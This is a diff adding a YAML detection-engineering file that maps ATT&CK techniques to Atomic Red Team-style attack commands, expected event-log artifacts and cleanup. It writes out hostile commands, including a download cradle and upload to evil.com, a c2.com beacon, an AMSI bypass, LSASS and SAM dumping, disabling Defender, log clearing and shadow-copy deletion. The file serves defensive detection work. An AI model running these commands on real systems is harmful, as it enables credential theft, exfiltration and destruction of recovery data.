@@ -1,0 +1,300 @@
+# Atomic Red Team test procedures per ATT&CK technique — WP 3.27b.
+# Actual commands attackers run, expected artifacts, and cleanup
+# procedures for each technique. Used to suggest needles based on
+# what real attacks produce.
+
+version: 1
+description: >
+  Atomic Red Team test procedures — actual commands, expected artifacts,
+  and cleanup for each ATT&CK technique. Maps technique ID to the
+  specific commands and artifacts that indicate the technique.
+source: "https://github.com/redcanaryco/atomic-red-team"
+
+packs:
+  # --- Execution ---
+  - technique: "T1059.001"
+    name: "PowerShell"
+    tests:
+      - name: "Encoded command"
+        command: "powershell.exe -enc <base64>"
+        artifacts: ["4688", "4104", "ScriptBlock", "powershell.exe"]
+        cleanup: "None"
+      - name: "Download cradle"
+        command: "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""
+        artifacts: ["4688", "4104", "3", "5156", "powershell.exe"]
+        cleanup: "None"
+      - name: "AMSI bypass"
+        command: "powershell.exe -nop -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
+        artifacts: ["4688", "4104", "powershell.exe"]
+        cleanup: "None"
+
+  - technique: "T1059.003"
+    name: "Windows Command Shell"
+    tests:
+      - name: "Cmd execution"
+        command: "cmd.exe /c whoami"
+        artifacts: ["4688", "cmd.exe", "whoami"]
+        cleanup: "None"
+      - name: "Net user enumeration"
+        command: "cmd.exe /c net user"
+        artifacts: ["4688", "net.exe", "net user"]
+        cleanup: "None"
+      - name: "Service creation"
+        command: "cmd.exe /c sc create testsvc binPath= \"C:\\test.exe\""
+        artifacts: ["7045", "sc.exe", "CreateService"]
+        cleanup: "sc delete testsvc"
+
+  # --- Credential Access ---
+  - technique: "T1003.001"
+    name: "LSASS Memory"
+    tests:
+      - name: "Procdump"
+        command: "procdump -ma lsass.exe lsass.dmp"
+        artifacts: ["4656", "4663", "lsass.dmp", "procdump.exe"]
+        cleanup: "del lsass.dmp"
+      - name: "Comsvcs MiniDump"
+        command: "rundll32.exe comsvcs.dll MiniDump <lsass_pid> dump.bin full"
+        artifacts: ["4656", "4663", "dump.bin", "comsvcs.dll"]
+        cleanup: "del dump.bin"
+      - name: "Nanodump"
+        command: "nanodump.exe --pid <lsass_pid> --write dump.bin"
+        artifacts: ["4656", "4663", "dump.bin", "nanodump.exe"]
+        cleanup: "del dump.bin"
+
+  - technique: "T1003.002"
+    name: "Security Account Manager"
+    tests:
+      - name: "Reg save SAM"
+        command: "reg save HKLM\\SAM sam.hive"
+        artifacts: ["4656", "4663", "sam.hive", "reg.exe"]
+        cleanup: "del sam.hive"
+      - name: "Esentutl"
+        command: "esentutl.exe /y %SystemRoot%\\System32\\config\\SAM /d sam_copy"
+        artifacts: ["4656", "4663", "sam_copy", "esentutl.exe"]
+        cleanup: "del sam_copy"
+
+  - technique: "T1003.003"
+    name: "NTDS"
+    tests:
+      - name: "Vssadmin NTDS"
+        command: "vssadmin create shadow /for=C:"
+        artifacts: ["4688", "vssadmin.exe", "shadow copy"]
+        cleanup: "vssadmin delete shadows /for=C: /quiet"
+      - name: "Ntdsutil"
+        command: "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q"
+        artifacts: ["4688", "ntdsutil.exe", "ntds.dit"]
+        cleanup: "rd /s /q c:\\temp"
+
+  # --- Persistence ---
+  - technique: "T1053.005"
+    name: "Scheduled Task"
+    tests:
+      - name: "Schtasks create"
+        command: "schtasks /create /tn \"TestTask\" /tr \"C:\\test.exe\" /sc onlogon"
+        artifacts: ["4698", "106", "200", "schtasks.exe", "\\Windows\\System32\\Tasks\\TestTask"]
+        cleanup: "schtasks /delete /tn \"TestTask\" /f"
+      - name: "At.exe"
+        command: "at.exe 13:37 /interactive cmd.exe"
+        artifacts: ["4698", "at.exe", "cmd.exe"]
+        cleanup: "at.exe /delete /yes"
+
+  - technique: "T1547.001"
+    name: "Registry Run Keys / Startup Folder"
+    tests:
+      - name: "Run key"
+        command: "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestKey\" /d \"C:\\test.exe\""
+        artifacts: ["4657", "4656", "reg.exe", "TestKey"]
+        cleanup: "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestKey\" /f"
+      - name: "Startup folder"
+        command: "copy test.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe\""
+        artifacts: ["4663", "test.exe", "Startup"]
+        cleanup: "del \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe\""
+
+  - technique: "T1543.003"
+    name: "Windows Service"
+    tests:
+      - name: "Sc create"
+        command: "sc.exe create TestSvc binPath= \"C:\\test.exe\" start= auto"
+        artifacts: ["7045", "4697", "sc.exe", "TestSvc"]
+        cleanup: "sc.exe delete TestSvc"
+
+  - technique: "T1546.003"
+    name: "WMI Event Subscription"
+    tests:
+      - name: "WMI persistence"
+        command: "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"TestFilter\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\""
+        artifacts: ["5861", "wmic.exe", "__EventFilter"]
+        cleanup: "wmic /namespace:\\\\root\\subscription PATH __EventFilter WHERE Name=\"TestFilter\" DELETE"
+
+  # --- Defense Evasion ---
+  - technique: "T1070"
+    name: "Defense Evasion"
+    tests:
+      - name: "Clear event logs"
+        command: "wevtutil cl System"
+        artifacts: ["1102", "wevtutil.exe", "System"]
+        cleanup: "None"
+      - name: "Disable Defender"
+        command: "powershell.exe -c \"Set-MpPreference -DisableRealtimeMonitoring $true\""
+        artifacts: ["5001", "powershell.exe", "DisableRealtimeMonitoring"]
+        cleanup: "powershell.exe -c \"Set-MpPreference -DisableRealtimeMonitoring $false\""
+      - name: "Delete shadow copies"
+        command: "vssadmin delete shadows /for=C: /quiet"
+        artifacts: ["4688", "vssadmin.exe", "shadow"]
+        cleanup: "None"
+
+  # --- Lateral Movement ---
+  - technique: "T1021"
+    name: "Remote Services"
+    tests:
+      - name: "PsExec"
+        command: "psexec.exe \\\\target -s cmd.exe"
+        artifacts: ["5140", "5145", "4624", "psexesvc.exe", "admin$"]
+        cleanup: "psexec.exe \\\\target -u -c"
+      - name: "WMI lateral"
+        command: "wmic /node:target process call create \"cmd.exe /c whoami\""
+        artifacts: ["4688", "wmic.exe", "/node:"]
+        cleanup: "None"
+      - name: "WinRM"
+        command: "winrs -r:target cmd.exe"
+        artifacts: ["4688", "winrs.exe", "winrm"]
+        cleanup: "None"
+
+  # --- Discovery ---
+  - technique: "T1082"
+    name: "System Information Discovery"
+    tests:
+      - name: "Systeminfo"
+        command: "systeminfo.exe"
+        artifacts: ["4688", "systeminfo.exe"]
+        cleanup: "None"
+      - name: "Net group"
+        command: "net group \"Domain Admins\" /domain"
+        artifacts: ["4688", "net.exe", "Domain Admins"]
+        cleanup: "None"
+      - name: "Nltest"
+        command: "nltest /dclist:domain.local"
+        artifacts: ["4688", "nltest.exe", "dclist"]
+        cleanup: "None"
+
+  # --- Collection ---
+  - technique: "T1074"
+    name: "Data Staged"
+    tests:
+      - name: "Compress staging"
+        command: "powershell.exe -c \"Compress-Archive -Path C:\\sensitive -DestinationPath C:\\temp\\staged.zip\""
+        artifacts: ["4663", "powershell.exe", "Compress-Archive", "staged.zip"]
+        cleanup: "del C:\\temp\\staged.zip"
+
+  # --- Exfiltration ---
+  - technique: "T1048"
+    name: "Exfiltration Over Alternative Protocol"
+    tests:
+      - name: "FTP exfil"
+        command: "ftp.exe -s:ftp.txt"
+        artifacts: ["4688", "ftp.exe", "ftp.txt"]
+        cleanup: "del ftp.txt"
+      - name: "Curl exfil"
+        command: "curl.exe -T staged.zip http://evil.com/upload"
+        artifacts: ["4688", "curl.exe", "staged.zip"]
+        cleanup: "del staged.zip"
+
+  # --- Command and Control ---
+  - technique: "T1071"
+    name: "Application Layer Protocol"
+    tests:
+      - name: "HTTP beacon"
+        command: "powershell.exe -c \"while($true){try{IEX (New-Object Net.WebClient).DownloadString('http://c2.com/beacon')}catch{};Start-Sleep 60}\""
+        artifacts: ["4688", "4104", "3", "5156", "powershell.exe"]
+        cleanup: "None"
+
+  # --- Impact ---
+  - technique: "T1486"
+    name: "Data Encrypted for Impact"
+    tests:
+      - name: "Ransomware simulation"
+        command: "powershell.exe -c \"Get-ChildItem C:\\test | ForEach-Object { $_.Name + '.locked' }\""
+        artifacts: ["4663", "powershell.exe", ".locked"]
+        cleanup: "None"
+
+  - technique: "T1490"
+    name: "Inhibit System Recovery"
+    tests:
+      - name: "Vssadmin delete"
+        command: "vssadmin delete shadows /for=C: /quiet"
+        artifacts: ["4688", "vssadmin.exe", "shadow"]
+        cleanup: "None"
+      - name: "Bcdedit"
+        command: "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+        artifacts: ["4688", "bcdedit.exe", "bootstatuspolicy"]
+        cleanup: "bcdedit /set {default} bootstatuspolicy DisplayAllFailures"
+
+  # --- Token / Credential Theft ---
+  - technique: "T1134"
+    name: "Token Manipulation"
+    tests:
+      - name: "Token impersonation"
+        command: "powershell.exe -c \"$token = [System.Security.Principal.WindowsIdentity]::GetCurrent().Token; [System.Security.Principal.WindowsIdentity]::Impersonate($token)\""
+        artifacts: ["4688", "powershell.exe", "Impersonate"]
+        cleanup: "None"
+
+  # --- Web Exfil ---
+  - technique: "T1567.002"
+    name: "Exfiltration to Cloud Storage"
+    tests:
+      - name: "Rclone"
+        command: "rclone.exe copy C:\\sensitive remote:backup"
+        artifacts: ["4688", "rclone.exe", "remote:backup"]
+        cleanup: "None"
+      - name: "Mega"
+        command: "mega-cmd.exe put C:\\sensitive"
+        artifacts: ["4688", "mega-cmd.exe", "mega.nz"]
+        cleanup: "None"
+
+  # --- RMM ---
+  - technique: "T1219"
+    name: "Remote Access Software"
+    tests:
+      - name: "AnyDesk"
+        command: "anydesk.exe --install"
+        artifacts: ["4688", "anydesk.exe", "--install"]
+        cleanup: "anydesk.exe --uninstall"
+      - name: "TeamViewer"
+        command: "teamviewer.exe --daemon"
+        artifacts: ["4688", "teamviewer.exe", "--daemon"]
+        cleanup: "teamviewer.exe --uninstall"
+
+  # --- Brute Force ---
+  - technique: "T1110.001"
+    name: "Password Guessing"
+    tests:
+      - name: "RDP brute force"
+        command: "for /l %i in (1,1,100) do net use \\\\target\\ipc$ /user:admin password%i"
+        artifacts: ["4625", "4776", "net.exe", "ipc$"]
+        cleanup: "None"
+
+  # --- Credentials ---
+  - technique: "T1552"
+    name: "Credentials in Files"
+    tests:
+      - name: "Unattend.xml"
+        command: "findstr /si password C:\\Windows\\Panther\\unattend.xml"
+        artifacts: ["4688", "findstr.exe", "unattend.xml", "password"]
+        cleanup: "None"
+      - name: "Registry credentials"
+        command: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword"
+        artifacts: ["4688", "reg.exe", "DefaultPassword"]
+        cleanup: "None"
+
+  # --- Valid Accounts ---
+  - technique: "T1078"
+    name: "Valid Accounts"
+    tests:
+      - name: "Net localgroup"
+        command: "net localgroup administrators"
+        artifacts: ["4688", "net.exe", "administrators"]
+        cleanup: "None"
+      - name: "Whoami /all"
+        command: "whoami.exe /all"
+        artifacts: ["4688", "whoami.exe", "/all"]
+        cleanup: "None"
